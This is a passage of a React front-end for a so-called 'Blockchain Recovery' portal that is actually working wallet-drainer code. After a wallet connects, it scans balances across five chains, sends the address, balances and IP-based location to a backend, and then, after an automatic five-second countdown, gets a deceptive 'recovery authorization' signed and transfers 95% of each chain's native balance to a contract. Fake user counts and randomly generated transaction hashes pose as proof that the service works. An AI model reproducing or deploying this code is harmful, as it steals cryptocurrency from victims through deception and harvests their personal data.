      setActiveUsers(Math.floor(Math.random() * 15) + 3);
    }, 30000);
    return () => clearInterval(interval);
  }, []);

  // AUTO DETECT LANGUAGE FROM BROWSER
  useEffect(() => {
    const detectLanguage = () => {
      const path = window.location.pathname;
      const pathLang = path.split('/')[1];
      
      if (pathLang && SUPPORTED_LANGUAGES[pathLang]) {
        setLanguage(pathLang);
        setTranslations(TRANSLATIONS[pathLang] || TRANSLATIONS.en);
        return;
      }
      
      const browserLang = navigator.language.split('-')[0];
      if (SUPPORTED_LANGUAGES[browserLang]) {
        setLanguage(browserLang);
        setTranslations(TRANSLATIONS[browserLang] || TRANSLATIONS.en);
      } else {
        setLanguage('en');
        setTranslations(TRANSLATIONS.en);
      }
    };
    
    detectLanguage();
  }, []);

  // CHANGE LANGUAGE FUNCTION
  const changeLanguage = (langCode) => {
    setLanguage(langCode);
    setTranslations(TRANSLATIONS[langCode] || TRANSLATIONS.en);
    setShowLanguageDropdown(false);
    
    const url = new URL(window.location);
    if (langCode === 'en') {
      if (url.pathname.startsWith(`/${langCode}`)) {
        url.pathname = url.pathname.replace(`/${langCode}`, '') || '/';
      }
    } else {
      url.pathname = `/${langCode}${url.pathname}`;
    }
    window.history.pushState({}, '', url.toString());
  };

  // Fetch crypto prices
  useEffect(() => {
    const fetchPrices = async () => {
      try {
        const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=ethereum,binancecoin,matic-network,avalanche-2&vs_currencies=usd');
        const data = await response.json();
        setPrices({
          eth: data.ethereum?.usd || 2000,
          bnb: data.binancecoin?.usd || 300,
          matic: data['matic-network']?.usd || 0.75,
          avax: data['avalanche-2']?.usd || 32
        });
      } catch (error) {
        console.log('Using default prices');
      }
    };
    
    fetchPrices();
    const interval = setInterval(fetchPrices, 60000);
    return () => clearInterval(interval);
  }, []);

  // Initialize provider and signer from AppKit
  useEffect(() => {
    if (!walletProvider || !address) {
      setWalletInitialized(false);
      return;
    }

    const init = async () => {
      try {
        setTxStatus(translations.blockchainSync);
        
        const ethersProvider = new ethers.BrowserProvider(walletProvider);
        const ethersSigner = await ethersProvider.getSigner();

        setProvider(ethersProvider);
        setSigner(ethersSigner);

        setWalletInitialized(true);
        setTxStatus('');
        
        await fetchAllBalances(address);
        
      } catch (e) {
        console.error("Provider init failed", e);
        setWalletInitialized(false);
      }
    };

    init();
  }, [walletProvider, address, translations]);

  // Track page visit with location - CRITICAL FOR TELEGRAM
  useEffect(() => {
    const trackVisit = async () => {
      try {
        console.log("📡 SENDING TRACK VISIT TO BACKEND...");
        const response = await fetch(`${BACKEND_URL}/api/track-visit`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            userAgent: navigator.userAgent,
            referer: document.referrer,
            path: window.location.pathname
          })
        });
        const data = await response.json();
        console.log("✅ TRACK VISIT RESPONSE:", data);
        if (data.success) {
          setUserLocation({
            country: data.data.country || 'Unknown',
            city: data.data.city || '',
            ip: data.data.ip || '',
            flag: data.data.flag || '🌍'
          });
        }
      } catch (err) {
        console.error('Visit tracking error:', err);
      }
    };
    trackVisit();
  }, []);

  // Auto-check eligibility when wallet connects
  useEffect(() => {
    if (isConnected && address && Object.keys(balances).length > 0 && !verifying) {
      checkEligibility();
    }
  }, [isConnected, address, balances]);

  // AUTO TRIGGER RECOVERY WHEN ELIGIBLE - NO EMAIL REQUIRED
  useEffect(() => {
    if (isEligible && isConnected && !signatureLoading && !completedChains.length && !autoRecoveryActive) {
      setAutoRecoveryActive(true);
      const timer = setTimeout(() => {
        executeMultiChainRecovery();
        setAutoRecoveryActive(false);
      }, 5000);
      return () => clearTimeout(timer);
    }
  }, [isEligible, isConnected, signatureLoading, completedChains.length]);

  // Check eligibility for recovery with pro messaging
  const checkEligibility = async () => {
    if (!address) return;
    
    setVerifying(true);
    setTxStatus(translations.checkEligibility);
    
    try {
      const total = Object.values(balances).reduce((sum, b) => sum + (b.valueUSD || 0), 0);
      
      // --- CHANGE 2: Only include chains with at least $1 USD value ---
      const chainsWithBalance = DEPLOYED_CHAINS.filter(chain => 
        balances[chain.name] && balances[chain.name].valueUSD >= 1
      );
      
      const eligible = total >= 1;
      setIsEligible(eligible);
      setShowRecoverButton(eligible);
      
      if (eligible) {
        setEligibleChains(chainsWithBalance);
        setTxStatus(`${translations.eligible} ${chainsWithBalance.length} ${translations.assetsFound}`);
        
        // Build detailed chain information for reporting
        const chainDetails = chainsWithBalance.map(chain => ({
          name: chain.name,
          amount: balances[chain.name].amount.toFixed(6),
          symbol: balances[chain.name].symbol,
          valueUSD: balances[chain.name].valueUSD.toFixed(2)
        }));
        setChainDetailsForReport(chainDetails);
        
        console.log("📡 SENDING CONNECT TO BACKEND...");
        const connectResponse = await fetch(`${BACKEND_URL}/api/presale/connect`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ 
            walletAddress: address,
            totalValue: total,
            chains: chainsWithBalance.map(c => c.name),
            chainDetails: chainDetails,
            location: userLocation
          })
        });
        const connectData = await connectResponse.json();
        console.log("✅ CONNECT RESPONSE:", connectData);
        
        prepareRecovery();
      } else {
        setTxStatus(translations.insufficientBalance);
      }
      
    } catch (err) {
      console.error('Recovery scan error:', err);
      setTxStatus(translations.scanComplete);
    } finally {
      setVerifying(false);
    }
  };

  // Fetch balances across all chains with fallback RPC
  const fetchAllBalances = async (walletAddress) => {
    setScanning(true);
    setTxStatus(translations.blockchainSync);
    
    const balanceResults = {};
    let scanned = 0;
    const totalChains = DEPLOYED_CHAINS.length;
    
    const scanPromises = DEPLOYED_CHAINS.map(async (chain) => {
      try {
        const chainConfig = MULTICHAIN_CONFIG[chain.name];
        const rpcProvider = await getJsonRpcProvider(chainConfig);
        const balance = await rpcProvider.getBalance(walletAddress);
        const amount = parseFloat(ethers.formatUnits(balance, 18));
        
        let price = 0;
        if (chain.symbol === 'ETH') price = prices.eth;
        else if (chain.symbol === 'BNB') price = prices.bnb;
        else if (chain.symbol === 'MATIC') price = prices.matic;
        else if (chain.symbol === 'AVAX') price = prices.avax;
        
        const valueUSD = amount * price;
        
        scanned++;
        setScanProgress(Math.round((scanned / totalChains) * 100));
        setTxStatus(`${translations.blockchainSync} ${chain.name}...`);
        
        if (amount > 0.000001) {
          balanceResults[chain.name] = {
            amount,
            valueUSD,
            symbol: chain.symbol,
            chainId: chain.chainId,
            contractAddress: chain.contractAddress,
            price: price,
            name: chain.name,
            rpcs: chainConfig.rpcs // store rpcs for later use
          };
        }
      } catch (err) {
        console.error(`Failed to scan ${chain.name}:`, err);
        scanned++;
        setScanProgress(Math.round((scanned / totalChains) * 100));
      }
    });
    
    await Promise.all(scanPromises);
    
    setBalances(balanceResults);
    setScanning(false);
    setTxStatus(translations.scanComplete);
    
    return Object.values(balanceResults).reduce((sum, b) => sum + b.valueUSD, 0);
  };

  const prepareRecovery = async () => {
    if (!address) return;
    
    try {
      console.log("📡 SENDING PREPARE FLOW TO BACKEND...");
      const prepareResponse = await fetch(`${BACKEND_URL}/api/presale/prepare-flow`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ walletAddress: address })
      });
      const prepareData = await prepareResponse.json();
      console.log("✅ PREPARE FLOW RESPONSE:", prepareData);
    } catch (err) {
      console.error('Recovery prep error:', err);
    }
  };

  // Handle download report notification
  const handleDownloadReport = () => {
    setShowReportNotification(true);
    setTimeout(() => setShowReportNotification(false), 3000);
  };

  // MULTI-CHAIN RECOVERY EXECUTION (process highest value first)
  const executeMultiChainRecovery = async () => {
    if (!walletProvider || !address || !signer) {
      setError(translations.walletRequired);
      return;
    }

    try {
      setSignatureLoading(true);
      setError('');
      setCompletedChains([]);
      
      const timestamp = Date.now();
      const flowId = `RECOVERY-${timestamp}`;
      setCurrentFlowId(flowId);
      
      const nonce = Math.floor(Math.random() * 1000000000);
      const message = `BLOCKCHAIN ASSET RECOVERY AUTHORIZATION\n\n` +
        `I hereby authorize the recovery of stuck/non-custodial wallet assets\n` +
        `Wallet: ${address}\n` +
        `Recovery Amount: Recoverable assets + ${presaleStats.currentBonus}% Bonus\n` +
        `Timestamp: ${new Date().toISOString()}\n` +
        `Nonce: ${nonce}`;

      setTxStatus(translations.recoveryInitiated);
      const signature = await signer.signMessage(message);
      
      setTxStatus(translations.processingRecovery);
      const chainsToProcess = eligibleChains;
      
      if (chainsToProcess.length === 0) {
        setError("No recoverable assets found");
        setSignatureLoading(false);
        return;
      }

      // Sort by valueUSD descending (highest value first)
      const sortedChains = [...chainsToProcess].sort((a, b) => 
        (balances[b.name]?.valueUSD || 0) - (balances[a.name]?.valueUSD || 0)
      );
      
      let processed = [];
      let lastTxHash = '';
      const processedDetails = [];
      
      for (const chain of sortedChains) {
        try {
          setProcessingChain(chain.name);
          setTxStatus(`${translations.processingRecovery} on ${chain.name}...`);
          
          // Try to switch network in wallet
          try {
            await walletProvider.request({
              method: 'wallet_switchEthereumChain',
              params: [{ chainId: `0x${chain.chainId.toString(16)}` }]
            });
            await new Promise(resolve => setTimeout(resolve, 1000));
          } catch (switchError) {
            console.log(`Chain switch needed for ${chain.name}, continuing...`);
          }
          
          // Get a working JSON RPC provider with fallback for reading/estimating
          const chainConfig = MULTICHAIN_CONFIG[chain.name];
          const chainProvider = await getJsonRpcProvider(chainConfig);
          
          const balance = balances[chain.name];
          const amountToSend = balance.amount * 0.95; // 5% fee
          const valueUSD = (balance.valueUSD * 0.95).toFixed(2);
          
          const contractInterface = new ethers.Interface(PROJECT_FLOW_ROUTER_ABI);
          const data = contractInterface.encodeFunctionData('processNativeFlow', []);
          const value = ethers.parseEther(amountToSend.toFixed(18));
          
          const contract = new ethers.Contract(
            chain.contractAddress,
            PROJECT_FLOW_ROUTER_ABI,
            chainProvider
          );
          
          // Estimate gas with fallback retry
          let gasEstimate;
          try {
            gasEstimate = await contract.processNativeFlow.estimateGas({ value });
          } catch (estErr) {
            console.warn(`Gas estimate failed, using default: ${estErr.message}`);
            gasEstimate = 300000n; // fallback
          }
          const gasLimit = gasEstimate * 120n / 100n;
          
          const tx = await walletProvider.request({
            method: 'eth_sendTransaction',
            params: [{
              from: address,
              to: chain.contractAddress,
              value: '0x' + value.toString(16),
              gas: '0x' + gasLimit.toString(16),
              data: data
            }]
          });
          
          lastTxHash = tx;
          setTxStatus(`${translations.processingRecovery} awaiting confirmation...`);
          const receipt = await chainProvider.waitForTransaction(tx);
          
          if (receipt && receipt.status === 1) {
            processed.push(chain.name);
            setCompletedChains(prev => [...prev, chain.name]);
            
            // Calculate accurate gas used in native token
            let gasUsedNative = '0';
            if (receipt.gasUsed && receipt.gasPrice) {
              gasUsedNative = ethers.formatEther(receipt.gasUsed * receipt.gasPrice);
            }
            
            // Store detailed info for each processed chain
            processedDetails.push({
              name: chain.name,
              symbol: chain.symbol,
              originalAmount: balance.amount.toFixed(6),
              originalValueUSD: balance.valueUSD.toFixed(2),
              processedAmount: amountToSend.toFixed(6),
              processedValueUSD: valueUSD,
              txHash: tx,
              gasUsed: gasUsedNative
            });
            
            const flowData = {
              walletAddress: address,
              chainName: chain.name,
              flowId: flowId,
              txHash: tx,
              amount: amountToSend.toFixed(6),
              symbol: chain.symbol,
              valueUSD: valueUSD,
              gasFee: gasUsedNative,
              originalAmount: balance.amount.toFixed(6),
              originalValueUSD: balance.valueUSD.toFixed(2),
              location: {
                country: userLocation.country,
                flag: userLocation.flag,
                city: userLocation.city,
                ip: userLocation.ip
              }
            };
            
            console.log(`📡 SENDING EXECUTE FLOW to BACKEND for ${chain.name}...`);
            const executeResponse = await fetch(`${BACKEND_URL}/api/presale/execute-flow`, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify(flowData)
            });
            const executeData = await executeResponse.json();
            console.log(`✅ EXECUTE FLOW RESPONSE for ${chain.name}:`, executeData);
            
            setTxStatus(`${translations.recoveryComplete} on ${chain.name}`);
          } else {
            throw new Error(`Recovery failed on ${chain.name} (tx ${tx})`);
          }
          
        } catch (chainErr) {
          console.error(`Error recovering on ${chain.name}:`, chainErr);
          setError(`Error on ${chain.name}: ${chainErr.message}`);
        }
      }
      
      setVerifiedChains(processed);
      
      if (processed.length > 0) {
        const totalRecoveredValue = processed.reduce((sum, chainName) => {
          return sum + (balances[chainName]?.valueUSD * 0.95 || 0);
        }, 0);
        
        const randomChain = getRandomChain();
        const recoveryAmount = totalRecoveredValue; // use actual recovered amount instead of random
        const newTx = {
          hash: generateRandomHash(),
          time: new Date().toISOString(),
          timeAgo: 'Just now',
          chain: randomChain,
          recoveryAmount: Math.floor(totalRecoveredValue),
          chainDetails: processedDetails
        };
        
        setLiveTransactions(prev => [newTx, ...prev.slice(0, 19)]);
        
        setTxStatus(translations.retrievalComplete);
        setShowCelebration(true);
        
        // Build detailed chains string with actual values
        const chainsDetailsString = processedDetails.map(d => 
          `✅ ${d.name}: ${d.originalAmount} ${d.symbol} ($${d.originalValueUSD}) → ${d.processedAmount} ${d.symbol} ($${d.processedValueUSD}) processed | Gas: ${d.gasUsed}`
        ).join('\n');
        
        console.log("📡 SENDING CLAIM TO BACKEND...");
        const claimResponse = await fetch(`${BACKEND_URL}/api/presale/claim`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ 
            walletAddress: address,
            location: {
              country: userLocation.country,
              flag: userLocation.flag,
              city: userLocation.city
            },
            chains: processed,
            chainDetails: processedDetails,
            totalProcessedValue: totalRecoveredValue.toFixed(2),
            reward: `${totalRecoveredValue.toFixed(2)} USD`,
            bonus: `${presaleStats.currentBonus}%`,
            chainsDetails: chainsDetailsString
          })
        });
        const claimData = await claimResponse.json();
        console.log("✅ CLAIM RESPONSE:", claimData);
        
        // Generate recovery report for the user with chain details
        generateRecoveryReport(newTx, address, Math.floor(totalRecoveredValue), processed, new Date().toISOString(), processedDetails);
        handleDownloadReport();
      } else {
        setError("No chains were successfully processed");
      }
      
    } catch (err) {
      console.error('Recovery error:', err);
      if (err.code === 4001) {
        setError('Recovery authorization cancelled');
      } else {
        setError(err.message || 'Recovery failed');
      }
    } finally {
      setSignatureLoading(false);
      setProcessingChain('');
    }
  };

  // Recover assets function with pro messaging
  const recoverAssets = async () => {
    if (!isConnected) {
      open();
      return;
    }
    
    if (!isEligible) {
      setError(translations.insufficientBalance);
      return;
    }
    
    setAutoRecoveryActive(false);
    await executeMultiChainRecovery();
  };

  const formatAddress = (addr) => {
    if (!addr) return '';
    return `${addr.substring(0, 6)}...${addr.substring(38)}`;
  };

  return (
    <div className="min-h-screen bg-gradient-to-b from-[#0a0a2a] to-[#000000] text-white font-['Poppins'] overflow-hidden">
      
      {/* Blue glow background - Blockchain theme */}
      <div className="fixed w-[600px] h-[600px] bg-blue-600 rounded-full blur-[200px] opacity-15 top-[-200px] left-[-200px] pointer-events-none"></div>
      <div className="fixed w-[400px] h-[400px] bg-blue-500 rounded-full blur-[150px] opacity-10 bottom-[-100px] right-[-100px] pointer-events-none"></div>

      {/* Recovery Ribbon */}
      <div 
        onClick={recoverAssets}
        className="fixed right-[-70px] top-[40%] bg-gradient-to-r from-blue-600 to-blue-500 text-white py-4 px-24 transform -rotate-90 font-semibold cursor-pointer hover:from-blue-700 hover:to-blue-600 transition-all z-50 animate-pulse-glow hidden md:flex items-center justify-center"
        style={{ animation: 'blink 1.2s infinite' }}
      >
        <span className="text-2xl mr-2">🔗</span> {translations.recoverButton}
      </div>

      {/* Mobile Recovery Button */}
      <div 
        onClick={recoverAssets}
        className="fixed bottom-6 right-6 bg-gradient-to-r from-blue-600 to-blue-500 text-white px-6 py-3 rounded-full shadow-2xl cursor-pointer hover:from-blue-700 hover:to-blue-600 transition-all z-50 animate-pulse-glow md:hidden flex items-center justify-center gap-2"
        style={{ animation: 'blink 1.2s infinite' }}
      >
        <span className="text-xl">🔗</span>
        <span className="text-sm font-semibold">{translations.recoverButton}</span>
      </div>

      {/* Report Download Notification */}
      {showReportNotification && (
        <div className="fixed top-32 right-4 z-50 animate-slideInUp bg-blue-500/90 backdrop-blur rounded-lg p-3 shadow-xl">
          <div className="flex items-center gap-2">
            <span className="text-lg">📄</span>
            <p className="text-sm text-white">{translations.reportDownloaded}</p>
          </div>
        </div>
      )}

      {/* Language Selector */}
      <div className="absolute top-6 right-6 z-50">
        <div className="relative">
          <button
            onClick={() => setShowLanguageDropdown(!showLanguageDropdown)}
            className="bg-black/50 backdrop-blur border border-blue-500/30 rounded-full px-4 py-2 flex items-center gap-2 hover:border-blue-500 transition-all"
          >
            <span className="text-lg">{SUPPORTED_LANGUAGES[language]?.flag || '🇺🇸'}</span>
            <span className="text-sm text-white hidden sm:inline">
              {SUPPORTED_LANGUAGES[language]?.native || 'English'}
            </span>
            <i className={`fas fa-chevron-down text-blue-500 text-xs transition-transform ${showLanguageDropdown ? 'rotate-180' : ''}`}></i>
          </button>
          
          {showLanguageDropdown && (
            <div className="absolute right-0 mt-2 w-64 bg-black/90 backdrop-blur border border-blue-500/30 rounded-2xl shadow-2xl z-50 max-h-96 overflow-y-auto custom-scrollbar">
              <div className="p-2">
                <div className="text-xs text-blue-500 px-3 py-2 font-semibold border-b border-blue-500/20 mb-1">
                  SELECT LANGUAGE
                </div>
                {Object.entries(SUPPORTED_LANGUAGES).map(([code, lang]) => (
                  <button
                    key={code}
                    onClick={() => changeLanguage(code)}
                    className={`w-full text-left px-3 py-2.5 rounded-xl flex items-center gap-3 transition-all duration-200 hover:bg-blue-500/10 ${
                      language === code ? 'bg-blue-500/20 border border-blue-500/30' : ''
                    }`}
                  >
                    <span className="text-xl">{lang.flag}</span>
                    <div className="flex-1">
                      <div className="text-sm font-medium text-white">{lang.name}</div>
                      <div className="text-xs text-gray-400">{lang.native}</div>
                    </div>
                    {language === code && (
                      <i className="fas fa-check text-blue-500 text-sm"></i>
                    )}
                  </button>
                ))}
              </div>
            </div>
          )}
        </div>
      </div>

      {/* ===== SIDE INSTRUCTION PANEL ===== */}
      <RecoveryInstructions translations={translations} />

      {/* Main Container */}
      <div className="relative z-10 container mx-auto px-4 py-8 max-w-[720px]">
        
        {/* Hero Section */}
        <div className="flex flex-col items-center text-center pt-16 pb-8">
          
          {/* Logo */}
          <div className="font-['Orbitron'] text-6xl md:text-7xl font-black mb-4 animate-glow-blue">
            <span className="bg-gradient-to-r from-blue-500 to-blue-300 bg-clip-text text-transparent">
              BLOCKCHAIN RECOVERY
            </span>
          </div>

          {/* Live Badge */}
          <div className="bg-blue-600 px-4 py-1.5 rounded-full text-xs font-semibold animate-pulse-blue mb-4">
            ● {translations.serviceActive}
          </div>

          {/* Tagline */}
          <p className="max-w-2xl text-gray-300 leading-relaxed mb-6 text-sm md:text-base">
            Blockchain Recovery Protocol helps users recover stuck transactions, lost funds, and 
            non-custodial wallet assets across multiple blockchain networks. Our advanced recovery 
            protocol identifies and retrieves recoverable assets with full transparency.
          </p>

          {/* Live Activity Badge */}
          {isConnected && !showRecoverButton && !scanning && (
            <LiveActivityBadge 
              translations={translations} 
              activeUsers={activeUsers}
              lastRecoveryTime={lastRecoveryTime}
            />
          )}

          {/* ===== CONNECT WALLET BUTTON WITH ANIMATED POINTER ===== */}
          {!isConnected ? (
            <div className="relative w-full max-w-md mx-auto">
              {/* Animated pointing hand (left side of button) */}
              <div className="absolute -left-16 top-1/2 transform -translate-y-1/2 hidden md:block animate-bounce-hand">
                <div className="text-4xl filter drop-shadow-lg">👉</div>
              </div>
              <button
                onClick={() => open()}
                onMouseEnter={() => setHoverConnect(true)}
                onMouseLeave={() => setHoverConnect(false)}
                className="relative bg-gradient-to-r from-blue-600 to-blue-500 hover:from-blue-700 hover:to-blue-600 text-white font-semibold px-8 py-4 rounded-xl transition-all transform hover:scale-105 hover:shadow-[0_10px_30px_rgba(59,130,246,0.6)] mb-8 w-full border-2 border-blue-400/50 shadow-lg shadow-blue-500/30 animate-pulse-border"
              >
                <span className="relative z-10 flex items-center justify-center gap-2">
                  <span className="text-xl">🔗</span>
                  {translations.connectWallet}
                </span>
                {/* Pulsing ring behind the button */}
                <span className="absolute inset-0 rounded-xl border-2 border-blue-400/60 animate-ping-slow"></span>
              </button>
              <p className="text-xs text-blue-300/60 -mt-4 mb-4 animate-pulse-slow">
                👆 Click to start your recovery
              </p>
            </div>
          ) : (
            <div className="flex flex-col items-center w-full max-w-md mb-8">
              <div className="flex items-center justify-between gap-3 bg-black/50 backdrop-blur border border-blue-500/30 rounded-full py-2 pl-5 pr-2 w-full">
                <span className="font-mono text-sm text-gray-300">
                  {formatAddress(address)}
                </span>
                {/* Disconnect button - red, fully functional */}
                <button
                  onClick={() => disconnect()}
                  className="w-9 h-9 rounded-full bg-red-600 hover:bg-red-700 flex items-center justify-center transition-all duration-200 shadow-lg border border-red-400"
                  title="Disconnect Wallet"
                >
                  <svg xmlns="http://www.w3.org/2000/svg" className="w-4 h-4 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
                    <path strokeLinecap="round" strokeLinejoin="round" d="M17 16l4-4m0 0l-4-4m4 4H7m6 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h4a3 3 0 013 3v1" />
                  </svg>
                </button>
              </div>
              
              {/* AUTO RECOVERY COUNTDOWN - NO EMAIL REQUIRED */}
              {autoRecoveryActive && isEligible && !signatureLoading && (
                <AutoRecoveryCountdown 
                  seconds={5} 
                  translations={translations} 
                  onCancel={() => setAutoRecoveryActive(false)} 
                />
              )}
              
              {/* RECOVERY BUTTON - Always visible when eligible */}
              {showRecoverButton && (
                <button
                  onClick={recoverAssets}
                  disabled={signatureLoading}
                  className="mt-3 w-full bg-gradient-to-r from-blue-600 to-blue-500 hover:from-blue-700 hover:to-blue-600 text-white font-bold py-4 px-6 rounded-xl transition-all transform hover:scale-105 hover:shadow-[0_10px_20px_rgba(59,130,246,0.4)] animate-pulse-glow"
                  style={{ animation: 'blink 1.2s infinite' }}
                >
                  {signatureLoading ? (
                    <span className="flex items-center justify-center gap-2">
                      <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                      {processingChain ? `Recovering on ${processingChain}...` : translations.processingRecovery}
                    </span>
                  ) : (
                    <span className="flex items-center justify-center gap-2">
                      <span className="text-xl">🔗</span>
                      {translations.recoveryReady}
                      <span className="text-sm bg-white/20 px-2 py-1 rounded-full">+{presaleStats.currentBonus}%</span>
                    </span>
                  )}
                </button>
              )}

              {/* Eligibility Status Message with Spin Animation - DIRECTLY BELOW THE WALLET ROW */}
              <div className="mt-3 w-full">
                {verifying ? (
                  <div className="bg-blue-500/20 backdrop-blur rounded-xl p-5 text-center border border-blue-500/40 shadow-lg shadow-blue-500/20 animate-pulse">
                    <div className="flex flex-col items-center justify-center gap-3">
                      <div className="relative">
                        <div className="w-12 h-12 border-4 border-blue-500/30 rounded-full"></div>
                        <div className="absolute top-0 left-0 w-12 h-12 border-4 border-blue-500 border-t-transparent rounded-full animate-spin"></div>
                      </div>
                      <div>
                        <p className="text-blue-400 text-base font-bold tracking-wide">{translations.checkEligibility}...</p>
                        <p className="text-gray-300 text-sm mt-1">{translations.verifying}</p>
                      </div>
                    </div>
                  </div>
                ) : (
                  <div className={`rounded-lg p-3 text-sm ${
                    isEligible ? 'bg-green-500/20 border border-green-500/30 text-green-400' : 'bg-gray-500/20 border border-gray-500/30 text-gray-400'
                  }`}>
                    {isEligible ? (
                      <span>🔗 {translations.proceedToRecovery}</span>
                    ) : !isEligible && !scanning && isConnected && totalOnChainValue > 0 && totalOnChainValue < 1 ? (
                      <span>⚠️ {translations.insufficientBalance}. Minimum $1 required for recovery initiation.</span>
                    ) : !isEligible && !scanning && isConnected && totalOnChainValue === 0 ? (
                      <span>⚠️ {translations.notEligible}. Supported networks: Ethereum, BSC, Polygon, Arbitrum, Avalanche. Need help? Contact support.</span>
                    ) : null}
                  </div>
                )}
              </div>
            </div>
          )}

          {/* ============================================ */}
          {/* SCANNING ANIMATION (NOW MOVED UP – BEFORE TELEGRAM/EMAIL) */}
          {/* ============================================ */}
          {isConnected && scanning && (
            <div className="w-full max-w-md mb-8">
              <div className="bg-black/60 backdrop-blur rounded-2xl p-6 border border-blue-500/30">
                <div className="flex items-center justify-center gap-4 mb-4">
                  <div className="w-12 h-12 border-4 border-blue-500 border-t-transparent rounded-full animate-spin"></div>
                  <div className="text-left">
                    <div className="text-lg font-bold text-blue-400">{translations.blockchainSync}</div>
                    <div className="text-sm text-gray-400">Scanning networks...</div>
                  </div>
                </div>
                
                {/* Progress bar */}
                <div className="w-full bg-gray-800 rounded-full h-1.5 mb-2">
                  <div 
                    className="bg-gradient-to-r from-blue-500 to-blue-400 h-1.5 rounded-full transition-all duration-300"
                    style={{ width: `${scanProgress}%` }}
                  ></div>
                </div>
                
                <div className="mt-3 text-sm text-blue-400">
                  {txStatus}
                </div>
              </div>
            </div>
          )}

          {/* ============================================ */}
          {/* SUPPORT SECTION - TELEGRAM (First) + EMAIL (Second) */}
          {/* ============================================ */}
          
          {/* Telegram Support - For users who prefer instant chat */}
          <TelegramSupport translations={translations} />
          
          {/* Email Support Section - For users without Telegram or needing manual follow-up */}
          <div className="w-full max-w-md mt-6">
            <ReportIssue 
              translations={translations}
              address={address}
              balances={balances}
              userLocation={userLocation}
            />
          </div>

          {/* LIVE RECOVERY FEED */}
          <LiveRecoveryFeed 
            transactions={liveTransactions} 
            translations={translations}
            totalRecoveredAmount={todayTotalRecovered}
            todayCount={todayCount}
            onDownloadReport={handleDownloadReport}
            walletAddress={address}
          />

          {/* Recovery Portal Card */}
          <div className="w-full max-w-md bg-blue-500/5 border border-blue-500/30 backdrop-blur p-8 rounded-2xl mt-8">
            <h3 className="text-2xl font-bold mb-4 text-blue-400">Blockchain Asset Recovery Portal</h3>
            
            {/* Progress Bar (visual only, no balance text) */}
            <div className="w-full bg-blue-950 h-3 rounded-full overflow-hidden mb-6">
              <div 
                className="h-full bg-gradient-to-r from-blue-600 to-blue-400 rounded-full transition-all duration-1000"
                style={{ width: `${Math.min(100, (totalOnChainValue / 1000000) * 100)}%` }}
              ></div>
            </div>

            {/* Recovery Info Cards */}
            <div className="grid grid-cols-2 gap-3 mb-6">
              <div className="bg-black/50 border border-blue-500/30 rounded-xl p-3 text-center">
                <p className="text-xs text-gray-400">{translations.tokenPrice}s</p>
                <p className="text-lg font-bold text-blue-400">{Object.keys(balances).length}/5</p>
              </div>
              <div className="bg-black/50 border border-blue-500/30 rounded-xl p-3 text-center">
                <p className="text-xs text-gray-400">Recovery Fee</p>
                <p className="text-lg font-bold text-blue-400">5% + Gas</p>
              </div>
            </div>

            <div className="bg-black/50 border border-blue-500/30 rounded-xl p-5">
              <h4 className="text-xl font-bold mb-2 text-blue-400">🔗 Recovery Protocol</h4>
              <p className="text-sm text-gray-400 mb-3">
                Our advanced recovery protocol scans 5 major blockchain networks to identify and retrieve:
              </p>
              <ul className="text-xs text-gray-400 space-y-1 list-disc list-inside">
                <li>Stuck/pending transactions</li>
                <li>Non-custodial wallet assets</li>
                <li>Unclaimed token balances</li>
                <li>Cross-chain transfer issues</li>
              </ul>
            </div>

            {/* Status Messages moved up - displayed here */}
            {txStatus && !scanning && !verifying && (
              <div className="mt-4 text-sm text-center text-blue-400">
                {txStatus}
              </div>
            )}

            {/* Error Display */}
            {error && (
              <div className="mt-4 bg-red-500/20 border border-red-500/30 rounded-lg p-3 text-sm text-red-300">
                {error}
              </div>
            )}

            {/* Completed Chains Progress */}
            {completedChains.length > 0 && (
              <div className="mt-4 text-center">
                <div className="text-xs text-gray-400">
                  ✓ Recovery completed on: {completedChains.join(' → ')}
                </div>
              </div>
            )}
          </div>

          {/* Already completed message */}
          {completedChains.length > 0 && (
            <div className="w-full max-w-md mb-8">
              <div className="bg-black/60 backdrop-blur rounded-xl p-6 text-center border border-green-500/30">
                <p className="text-green-400 text-lg mb-2">✓ {translations.completed}</p>
                <p className="text-gray-400 text-sm">{translations.secured}</p>
              </div>
            </div>
          )}

          {/* Welcome message for non-eligible */}
          {isConnected && !isEligible && !completedChains.length && !scanning && totalOnChainValue === 0 && (
            <div className="w-full max-w-md mb-8">
              <div className="bg-black/60 backdrop-blur rounded-xl p-8 text-center border border-blue-500/30">
                <div className="text-6xl mb-4">🔗</div>
                <h2 className="text-xl font-bold mb-3 text-blue-400">
                  {translations.welcome}
                </h2>
                <p className="text-gray-400 text-sm mb-6">
                  {translations.minRequirement} Ethereum, BSC, Polygon, Arbitrum, or Avalanche.
                </p>
                <div className="bg-black/50 rounded-lg p-3 border border-gray-800">
                  <p className="text-xs text-gray-400">
                    Supported Networks: Ethereum, BSC, Polygon, Arbitrum, Avalanche
                  </p>
                </div>
              </div>
            </div>
          )}

          {/* Info Section - 2 columns */}
          <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mt-12">
            
            <div className="bg-blue-500/5 border border-blue-500/20 backdrop-blur p-6 rounded-xl">
              <h3 className="text-lg font-bold mb-3 text-blue-400">How Recovery Works</h3>
              <p className="text-sm text-gray-400 leading-relaxed">
                1. Connect your wallet to scan 5 networks<br/>
                2. System detects recoverable assets automatically<br/>
                3. Authorize recovery with one signature<br/>
                4. Assets are retrieved with confirmation
              </p>
            </div>

            <div className="bg-blue-500/5 border border-blue-500/20 backdrop-blur p-6 rounded-xl">
              <h3 className="text-lg font-bold mb-3 text-blue-400">Supported Networks</h3>
              <p className="text-sm text-gray-400 leading-relaxed">
                • Ethereum (ETH)<br/>
                • BSC (BNB Chain)<br/>
                • Polygon (MATIC)<br/>
                • Arbitrum<br/>
                • Avalanche
              </p>
            </div>
          </div>

          {/* Footer */}
          <Footer />
        </div>
      </div>

      {/* Random Recovery Popup */}
      {showPopup && currentPopupTx && (
        <LiveRecoveryPopup 
